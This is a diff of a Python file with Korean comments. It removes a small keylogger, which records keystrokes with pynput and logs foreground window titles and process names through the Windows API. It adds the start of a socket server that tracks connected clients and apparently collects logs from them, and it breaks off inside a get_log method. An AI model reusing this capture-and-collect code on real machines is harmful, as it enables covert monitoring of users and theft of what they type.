@@ -1,44 +1,63 @@
-import os
+from sendrecv import SendRecv
+import socket
+import pickle
 import time
-from threading import Thread
-from pynput.keyboard import Listener
-import ctypes
-import psutil
-
-def on_press(key):
-    print(key)
 
 
-def get_title():
-    user32 = ctypes.windll.LoadLibrary('user32.dll')
-    handle = user32.GetForegroundWindow() # 현재 활성화 윈도우 핸들
-    buffer = ctypes.create_unicode_buffer(255) # 저장버퍼 할당
-    user32.GetWindowTextW(handle, buffer, ctypes.sizeof(buffer)) # 버퍼에 타이들 저장
-    pid = ctypes.c_ulong()
-    user32.GetWindowThreadProcessId(handle, ctypes.byref(pid)) # pid를 얻음
-    pid = pid.value
-    if pid == 0:
-        return 0, ""
-    p = psutil.Process(pid)
-    title = p.name() + " " + buffer.value
-    return pid, title
+class Server:
+    def __init__(self, ip="0.0.0.0", port=8888):
+        self.host = ip
+        self.port = port
+        self.all_connections = {}
+        self.cur_con = None
 
+        self.sock = self.create_socket(self.port)
 
-def win_title():
-    pid, title = get_title()
-    while True:
-        time.sleep(0.1)
-        new_pid, new_title = get_title()
-        if new_title and title != new_title:
-            print("title change %d [%s]" % (new_pid, new_title))
-            pid, title = new_pid, new_title
+    def create_socket(self, port):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind((self.host, self.port))
+            sock.listen(20)
+        except socket.error as msg:
+            print("소켓 생성 에러... %s" % str(msg))
+            time.sleep(3)
+            print("다시 시도 합니다....")
+            self.create_socket()
+        return sock
 
-def main():
-    with Listener(on_press=on_press) as listener:
-        listener.join()
+    def connect_socket(self, progress_callback):
+        try:
+            conn, address = self.sock.accept()
+            self.sock.setblocking(1)
+            controller = SendRecv(conn)
+            print(f"[!]새로운 클라이언트가 연결되었습니다 => [{address[0]}:{str(address[1])}]")
+            address = f"{address[0]}:{str(address[1])}"
+            self.all_connections[address] = controller
+            print(f"{address} 연결 성공")
+            return self.refresh(progress_callback)
+        except:
+            print(f"{address} 연결 실패")
+            return []
 
-mainThread = Thread(target=main)
-titleThread = Thread(target=win_title)
+    def refresh(self, progress_callback=None):
+        """ 연결된 클라이언트가 연결되어 있는지 확인& 갱신"""
+        for key in list(self.all_connections.keys()):
+            try:
+                controller = self.all_connections[key]
+                controller.send(b":check")
+                data = controller.recv()
+                if data == b":Done":
+                    continue
+            except:
+                del self.all_connections[key] # 연결이 끊긴 ip 삭제
+                continue
 
-mainThread.start()
-titleThread.start()
+        if progress_callback is None:
+            # listview update
+            return None
+        else:
+            return list(self.all_connections.keys())
+
+    def get_log(self):
+        """ 쓰레드"""
